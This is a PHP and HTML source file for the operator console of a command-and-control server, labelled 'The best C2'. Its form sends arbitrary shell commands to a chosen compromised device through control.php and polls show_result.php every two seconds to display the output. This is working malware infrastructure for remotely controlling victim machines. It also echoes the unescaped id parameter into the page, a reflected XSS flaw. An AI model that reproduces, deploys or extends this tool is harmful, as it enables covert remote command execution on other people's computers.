<?php
	require "../functions.php";

	if (!isset($_GET['id'])) {
		header('Location: ../app.php');
	}

	$id = $_GET['id'];
	
	$ok = is_exists($id);
	if ($ok != True) {
		header('Location: ../app.php');
	}

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CONTROL DEVICE</title>
	<style type="text/css">
		code {
			color: white;
			background: #16191d;
		 	display: block;
		 	font-size: 12pt;
		 	line-height: 11pt;
			padding: 8px;
		 	border: 1.5px solid #79b8ff;
		 	white-space: break-spaces;
		 	overflow-wrap: break-word;
		}
	</style>
	<link rel="stylesheet" type="text/css" href="../static/style.css">
</head>
<body>
	<header>
		<div class='title'><a style='text-decoration: none; color: white;' href='../app.php'>The best C2</a></div>
		<div class="nav">
			<?php echo '<p style="color: white;" id="dev">'.$id.'</p>'; ?>
		</div>
	</header>
	<main>
		<div class="post">
			command to execute: <input type="text" id="comm"> <input type="submit" onclick="send_command()" value="send">
			<br>
			Output console:
			<code id="output"></code>
		</div>
	</main>
	<script type="text/javascript">
		function escapeHtml(text) {
			var map = {
				'&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
			};
			return text.replace(/[&<>"']/g, function(m) { return map[m]; });
		}

		function send_command() {
			let command = document.getElementById('comm').value;
			let computer_id = document.getElementById('dev').innerText.trim();

			var xhr = new XMLHttpRequest();

			xhr.open("GET", "/c2_server/control/control.php?com_id="+computer_id+"&command="+command, true);

			xhr.send();
		}

		function fetchResults() {
			var xhr = new XMLHttpRequest();

			let command = document.getElementById('comm').value;
			var com_id = document.getElementById('dev').innerText.trim();

			xhr.open("GET", "/c2_server/show_result.php?id=" + com_id, true);

			xhr.onreadystatechange = function() {
				if (xhr.readyState === XMLHttpRequest.DONE) {
					if (xhr.status === 200) {
						var result = xhr.responseText;
						result = result.replace(/\n/g, "\n");

						if (result != "") {
							document.getElementById('output').innerHTML += "shell>" + command + "\n" + escapeHtml(result) + "\n\n";
						}

					}
					else {
						console.log('response code != 2000');
					}
				}
			};

			xhr.send();
		}
		setInterval(fetchResults, 2000);
	</script>
</body>
</html>